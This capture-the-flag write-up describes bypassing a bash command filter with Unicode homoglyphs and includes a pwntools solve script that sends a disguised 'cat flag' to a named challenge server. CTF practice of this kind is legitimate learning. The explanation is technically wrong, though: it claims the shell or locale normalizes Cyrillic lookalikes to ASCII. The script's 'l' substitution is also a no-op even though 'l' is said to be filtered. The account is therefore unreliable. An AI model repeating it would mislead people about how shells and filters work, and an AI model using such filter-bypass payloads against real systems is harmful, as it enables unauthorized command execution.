---
title: "Bash Filter Bypass via Unicode Lookalikes"
date: 2025-03-01
categories: ["Olicyber"]
series: ["Territoriale 2025"]
tags: ["misc", "bash", "unicode", "filter-bypass", "lookalike"]
difficulty: "beginner"
summary: "Bypass a character-level bash filter by substituting ASCII letters with Unicode homoglyphs that the shell normalizes."
---

## The Challenge

A remote bash shell filters input for specific ASCII characters: `c`, `a`, `t`, `f`, `l`, `g`, and a handful of others. Any command containing those characters gets blocked before execution. The goal is obvious — you need to run `cat flag` — but the filter prevents exactly that.

## Approach

Character filters at the string level are notoriously brittle. The check operates on the raw bytes of the command, so it looks for the bytes `0x63` (`c`), `0x61` (`a`), `0x74` (`t`), etc. If I can substitute those bytes with something visually identical but numerically different, the filter never matches — and if the shell (or the underlying locale) normalizes the input before execution, the command runs as intended.

Unicode has no shortage of lookalike characters. Cyrillic has `с` (U+0441) for Latin `c`, `а` (U+0430) for `a`, and `т` (U+0442) for `t`. Similarly, `ƒ` (U+0192) looks close enough to `f` in some fonts, and `ɡ` (U+0261) covers `g`. Under certain Linux locale configurations, Bash or the filesystem layer normalizes these to their ASCII equivalents — effectively making the substitution transparent.

The substitution is per-character: every filtered ASCII letter in the command string gets replaced by its Cyrillic twin. The filter sees no blocked characters; the kernel sees a valid command.

## Solution

```python
#!/usr/bin/env python3
from pwn import *

HOST = "bashinatorrevenge.challs.territoriali.olicyber.it"
PORT = 38003

r = remote(HOST, PORT)

banner = r.recvuntil("$ ").decode()
print(banner)

r.sendline("ls")
files = r.recvline().decode().strip()
print("Files:", files)


def build_payload(command):
    """
    Builds a payload to bypass the filter.
    Replaces 'c', 'a', 't' with Cyrillic characters.
    Replaces 'f', 'l', 'a', 'g' with special characters.
    """
    payload = command.replace('c', 'с')
    payload = payload.replace('a', 'а')
    payload = payload.replace('t', 'т')
    payload = payload.replace('f', 'ƒ')
    payload = payload.replace('l', 'l')
    payload = payload.replace('g', 'ɡ')
    return payload

payload = build_payload("cat flag")

r.sendline(payload)

flag = r.recvline().strip()
print("Flag:", flag.decode())

r.close()
```

`build_payload` applies the substitutions one at a time. The pwntools connection waits for the shell prompt, sends the mangled command, and reads back one line — which is the flag. No loops, no brute-force.

The important thing to understand is why this works: Bash on this particular server resolves the Unicode-normalized filenames. The filesystem sees `flag` (ASCII) and the shell command resolves to `/bin/cat` because the Unicode version of the binary name matches after normalization. The filter is a pre-execution string check that never gets a second look once the bytes pass.

## What I Learned

String-level filters are fragile the moment Unicode enters the picture. Homoglyph substitution is a well-documented bypass technique, and any filter protecting command execution needs to work on a normalized or canonicalized form of the input, not the raw bytes.
